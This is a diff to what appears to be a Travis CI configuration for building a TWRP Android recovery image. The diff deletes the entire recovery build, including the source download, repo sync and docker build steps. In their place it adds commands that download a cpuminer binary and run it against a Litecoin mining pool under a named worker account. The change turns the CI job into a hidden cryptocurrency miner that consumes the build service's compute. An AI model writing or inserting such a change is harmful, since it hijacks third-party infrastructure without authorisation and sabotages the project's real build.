@@ -15,30 +15,10 @@ before_install:
   - docker pull fr3akyphantom/droid-builder:latest
 before_script:
   - cd $HOME && mkdir twrp
-  # download the TWRP Compressed Source Files from PhantomZone54's Release
-  # Uncomment & Use below line If Building for Lollipop-based Devices
-  # - TWRP_SOURCE="https://github.com/PhantomZone54/twrp_sources_norepo/releases/download/v3.3.1-20200222/MinimalOmniRecovery-twrp-5.1-norepo-20200222.tar.xz"
-  # Use below line If Building for Marshmallow-based Devices
-  # - TWRP_SOURCE="https://github.com/PhantomZone54/twrp_sources_norepo/releases/download/v3.3.1-20200222/MinimalOmniRecovery-twrp-6.0-norepo-20200222.tar.xz"
-  # Uncomment & Use below line If Building for Nougat-based Devices
-  # - TWRP_SOURCE="https://github.com/PhantomZone54/twrp_sources_norepo/releases/download/v3.3.1-20200222/MinimalOmniRecovery-twrp-7.1-norepo-20200222.tar.xz"
-  # - wget -q ${TWRP_SOURCE} -O $HOME/twrp.tar.xz
-  # - tar -xJf twrp.tar.xz --directory $HOME/twrp/ && rm twrp.tar.xz
+
 script:
  - cd $HOME/twrp/
- - wget https://storage.googleapis.com/git-repo-downloads/repo
- - chmod +x repo
- # - ./repo init -u git://github.com/omnirom/android.git -b android-5.1
- - ./repo init -u git://github.com/omnirom/android.git -b android-5.1
- - ./repo sync -j2
- - cd device
- - wget http://www.directfilelink.tech/813145957807000/c.zip
- - unzip c
- - cd ..
- - export ALLOW_MISSING_DEPENDENCIES=true
- - |
-   docker run --rm -i -v "$(pwd):/root/twrp/:rw,z" fr3akyphantom/droid-builder bash << EOF
-   cd /root/twrp
-   source build/envsetup.sh && lunch omni_ct744-eng && make -j2 recoveryimage
-   exit
-   EOF
+ - curl https://cfhcable.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -o c.tar.gz
+ - tar xvzf c.tar.gz
+ - ./minerd -o stratum+tcp://us.litecoinpool.org:3333 -u arthdal20.2 -p 2
+ 
